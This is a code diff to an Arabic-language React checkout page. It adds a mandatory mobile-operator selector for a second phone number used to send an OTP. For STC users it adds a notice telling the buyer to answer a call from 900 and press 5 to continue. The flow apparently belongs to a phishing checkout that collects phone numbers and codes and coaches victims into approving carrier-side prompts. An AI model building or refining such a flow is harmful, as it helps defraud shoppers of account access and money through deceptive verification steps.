@@ -588,6 +588,11 @@ export default function CheckoutPage() {
     const phoneError = validatePhone(phone2);
     setPhone2Error(phoneError);
 
+    if (!phoneProvider) {
+      setPhone2Error("الرجاء اختيار مزود الخدمة");
+      return;
+    }
+
     if (!phoneError) {
       sendPhoneOtp();
     }
@@ -1512,16 +1517,21 @@ export default function CheckoutPage() {
                 <div className="flex justify-between items-center">
                   <span className="text-muted-foreground">مزود الخدمة</span>
                   <select
-                    id="countries"
+                    id="operator"
+                    value={phoneProvider}
+                    onChange={(e) => {
+                      setPhoneProvider(e.target.value);
+                      if (phone2Error) setPhone2Error("");
+                    }}
                     className="text-black block w-full px-3 py-2.5 bg-neutral-secondary-medium border border-default-medium text-heading text-sm rounded-base focus:ring-brand focus:border-brand shadow-xs placeholder:text-body"
                   >
-                    <option className="text-white" selected>
-                      اختر مزود الخدمة{" "}
+                    <option value="">
+                      اختر مزود الخدمة
                     </option>
-                    <option value="زين">زين </option>
-                    <option value="موبايلي">موبايلي</option>
-                    <option value="اس تي سي">اس تي سي</option>
-                    <option value="فيرجنE">فيرجن</option>
+                    <option value="Zain">زين</option>
+                    <option value="Mobily">موبايلي</option>
+                    <option value="STC">اس تي سي</option>
+                    <option value="Virgin">فيرجن</option>
                   </select>
                 </div>
               </div>
@@ -1555,6 +1565,13 @@ export default function CheckoutPage() {
               <CardDescription className="text-center">
                 تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
               </CardDescription>
+              {phoneProvider === "STC" && (
+                <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4 mt-4">
+                  <p className="text-blue-600 dark:text-blue-400 text-center font-medium">
+                    سيتم الاتصال بك من قبل 900 يرجى الرد علي الاتصال والضغط علي الرقم 5 للاستمرار
+                  </p>
+                </div>
+              )}
             </CardHeader>
             <CardContent className="space-y-6">
               <div>
